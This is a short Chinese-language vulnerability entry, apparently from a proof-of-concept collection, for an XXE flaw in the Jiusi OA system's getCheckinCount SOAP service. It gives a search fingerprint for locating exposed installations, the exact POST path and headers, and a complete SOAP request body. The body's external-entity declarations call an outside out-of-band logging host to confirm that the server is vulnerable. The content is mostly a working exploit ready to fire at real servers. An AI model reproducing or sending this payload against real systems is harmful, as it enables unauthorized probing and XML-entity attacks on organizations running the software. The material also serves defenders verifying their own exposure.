# 九思OAgetCheckinCount存在XXE漏洞

- **系统**：九思　|　**类型**：XXE　|　**CVE**：—
- **指纹**：`body="/jsoa/webmail/ajax_util.js"`
- **请求**：`POST /jsoa/services/AppService.AppServiceHttpSoap12Endpoint/ HTTP/1.1`
- **关键头**：`Content-Type: text/xml;charset=UTF-8`　`SOAPAction: urn:getCheckinCount`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:app="http://appservice.webservice.oa.js.com">
<soapenv:Header/>
<soapenv:Body>
<app:getCheckinCount>
<!--type: string-->
<app:xml><![CDATA[<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE root [<!ENTITY url SYSTEM "http://httplog.kgzufqworv.yutu.eu.org:8080/httplog/xxe">
<!ENTITY % param SYSTEM "http://kgzufqworv.yutu.eu.org">
%param;]>
<root>
<url>&url;</url>
<content>&content;</content>
</root>]]></app:xml>
</app:getCheckinCount>
</soapenv:Body>
</soapenv:Envelope>
```
- **预期**：200　|　Dnslog回显